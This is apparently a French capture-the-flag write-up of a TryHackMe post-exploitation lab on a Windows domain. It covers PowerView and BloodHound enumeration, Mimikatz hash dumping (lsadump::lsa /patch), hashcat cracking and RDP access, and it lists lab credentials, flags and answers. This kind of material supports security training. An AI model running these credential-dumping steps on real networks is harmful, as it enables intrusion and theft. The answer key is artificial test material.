## Post-Exploitation

Utiliser SSH pour se connecter avec la machine Windows Server 1.1 avec les crédentials :
* Utilisateur : Administrator
* Mot de passe : P@$$W0rd
* Nom de domaine : CONTROLLER

#### Powerview :

Une fois sur la machine, lancer le PowerShell avec l'option -ep bypass :
```console
PS C:\Users\Administrator> powershell -ep bypass
```

PowerView est un outil de reconnaissance que qu'il faut utiliser avec beaucoup de précautions. Il écrit en powerShell. Le script PowerView.ps1 contient un certain nombre de fonctions que l'on peut utiliser pour énumérer le domaine.
Le lancer :
```console
PS C:\Users\Administrator>. .\Downloads\PowerView.ps1
```

Code source : https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1

Afin de visualiser toutes les fonctions fournies par le script voici une astuce :
```console
PS C:\Users\kreese\Documents> $currentFunctions = Get-ChildItem function:
PS C:\Users\kreese\Documents> . .\PowerView.ps1
PS C:\Users\kreese\Documents> $scriptFunctions = Get-ChildItem function: | Where-Object { $currentFunctions -notcontains $_ }
PS C:\Users\kreese\Documents> $scriptFunctions | Format-Wide -Column 4
```

Informations générales au sujet du domaine :
```console
Réponse : Get-NetDomainController
```

Enumérer les Common Name des utilisateurs du domaine :
```console
Réponse : Get-NetUser | select cn
```

Enumérer les groupes de type admin :
```console
Réponse : Get-NetGroup -GroupName *admin*
```

Quel est le dossier partagé qui n'est pas configuré en tant que tel par défaut ? Utiliser la commande Invoke-ShareFinder.
```console
Réponse : Share
```

Quel système d'exploitation s'exécute à l'intérieur du réseau en plus de Windows Server 2019 ?
```console
Réponse : Get-NetComputer -fulldata | select operatingsystem
```

```console
Réponse : Windows 10 Enterprise Evaluation
```

Un flag est caché parmi les utilisateurs. Trouvez le.
```console
Réponse : POST{P0W3RV13W_FTW}
```

---

#### Bloodhound :

<p align="center">
  <img src="https://i.imgur.com/BAT2ZAH.png" />
</p>

BloodHound est un outil permettant de cartographier un environnement Active Directory en le représentant sous forme de graphe.

##### Sur la machine Kali Linux :

Installer Neo4j :
```console
$ sudo apt-get update
$ sudo apt-get install neo4j
```
Vérifier la version :
```console
$ neo4j --version
```

Neo4j est un système de gestion de base de données au code source libre basée sur les graphes. Il est utilisé par Bloodhound.<br/>
Lancer Neo4j et vérifier que le service est accessible via le browser :
```console
$ neo4j console
```

<p align="center">
  <img src="https://pencer.io/assets/images/2020-06-09-14-53-59.png" />
</p>

Installer Bloodhound :
```console
$ sudo apt-get install bloodhound
```

##### Une fois sur la machine Windows :

Lancer le PowerView avec l'option -ep bypass :
```console
PS C:\Users\Administrator> powershell -ep bypass
```

SharpHound est le collecteur de données officiel de BloodHound. Il est écrit en C# et utilise des fonctions API Windows natives et des fonctions d'espace de noms LDAP pour collecter des données à partir de contrôleurs de domaine.<br/>
Le lancer :
```console
. .\Downloads\SharpHound.ps1
```

```console
Réponse : Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName all-data.zip
```
<p>
  <img src="img/Screenshot_2021-09-20-TryHackMe-Post-Exploitation-Basics.png" />
</p>

Transférer l'archive générée vers votre machine linux d'attaque. Utiliser scp.

Exemple : scp username@IP_of_windows_machine:/C:/Users/Anshul/Desktop/myfile.zip /home/ubuntu/myfile.zip

Une fois sur la machine Kali Linux charger le fichier zip avec Bloodhound pour avoir la cartographie du domaine de la machine cible.<br/>
Utiliser les crédentials neo4j/neo4j pour se connecter.

<p align="center">
  <img src="https://i.imgur.com/thfZUOy.png" />
</p>

Quel service est-il également un domain admin ?
```console
Réponse : sqlservice
```

Quels sont les deux utilsateurs Kerberos ?
```console
Réponse : sqlservice, krbtgt
```

---

#### Mimikatz :

Mimikatz est un outil de post-exploitation qui permet de faire des dumps des mots de passe de la mémoire, mais aussi des hash, des codes PIN et des tickets pour le protocole d'identification réseau Kerberos.

Lancer Mimikatz :
```console
PS C:\Users\Administrator> cd .\Downloads\
PS C:\Users\Administrator\Downloads> .\mimikatz.exe
```

Vérifier que la sortie est "Privilege '20' ok" : Cela garantit que vous exécutez mimikatz en tant qu'administrateur.
```console
mimikatz # privilege::debug
```

Dumper les hashes :
```console
mimikatz # lsadump::lsa /patch
```

<p align="center">
  <img src="img/Screenshot_2021-09-20-TryHackMe-Post-Exploitation-Basics_01.png"/>
</p>

Maintenant que nous avons les hachages, nous pouvons essayer de les casser. Commençons par le faire en utilisant hashcat et rockyou.txt :

```console
$ locate rockyou.txt
```

Récuperer les hachages dans un fichier hashes.txt et faites tourner hashcat pour trouver les équivalents :
```console
$ cat hashes.txt
$ hashcat -m 1000 --force hashes.txt /usr/share/wordlists/rockyou.txt
```

En cas d'erreur :

Il faut installer les librairies nécessaires au fonctionnement de hashcat supérieur à la version 3.3.x :
```console
$ apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev
$ apt-get install pocl-opencl-icd
```

Quel est le mot de passe de la Machine1 ?
```console
Réponse : Password1
```

Quel est le hash du mot de passe de la Machine2 ?
```console
Réponse : c39f2beb3d2ec06a62cb887fb391dee0
```

---

#### Server Manager :

Se connecter à la machine Windows en Remote Desktop Protocol avec les crédentials :
* Utilisateur : Administrator
* Mot de passe : P@$$W0rd
* Nom de domaine : controller.local

```console
$ rdesktop -u SG ADRESSE_IP
```

<p align="center">
  <img src="https://cdn.dlcompare.com/game_tetiere/upload/gameimage/file/43698.png" />
</p>

Quel outil permet des tracer les evénements ?
```console
event viewer
```

Quel est le mot de passe du service SQL ? Regarder la description.
```console
MYpassword123#
```
